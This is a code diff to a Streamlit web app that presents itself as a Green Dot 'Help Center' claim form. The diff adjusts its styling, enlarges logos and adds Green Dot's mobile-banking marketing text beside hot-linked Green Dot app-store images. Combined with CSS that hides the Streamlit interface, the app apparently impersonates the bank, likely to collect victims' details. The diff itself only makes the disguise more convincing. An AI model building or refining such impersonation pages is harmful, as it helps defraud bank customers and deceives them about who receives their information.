@@ -37,7 +37,7 @@ st.markdown("""<style>
     visibility: hidden !important;
 }
 
-/* Desactivar clics en textos y logos para evitar que actúen como botones */
+/* Desactivar clics en textos y logos */
 h1, h2, h3, [data-testid="stImage"] {
     pointer-events: none !important;
     user-select: none !important;
@@ -49,7 +49,7 @@ h1, h2, h3, [data-testid="stImage"] {
     color: #FFFFFF !important;
 }
 
-/* Botón verde esmeralda personalizado */
+/* Botón verde esmeralda */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -87,7 +87,7 @@ input {
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists('logo.svg'):
-    st.image('logo.svg', width=150)
+    st.image('logo.svg', width=160)
 
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
@@ -107,12 +107,13 @@ if submitted:
     else:
         st.error("⚠️ All fields are required.")
 
-# SECCIÓN DE APP STORES RESTAURADA
+# SECCIÓN DE APP STORES CON DESCRIPCIÓN REFORZADA
 st.markdown("""<div class='app-promo-container'>
-    <h3 style='color:white;'>Download the Green Dot app</h3>
-    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'>
+    <h2 style='color:white; margin-bottom:10px;'>Download the Green Dot app</h2>
+    <p style='color:#bbb; max-width:600px; margin: 0 auto 25px auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
+    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap;'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
     </div>
 </div>""", unsafe_allow_html=True)
 
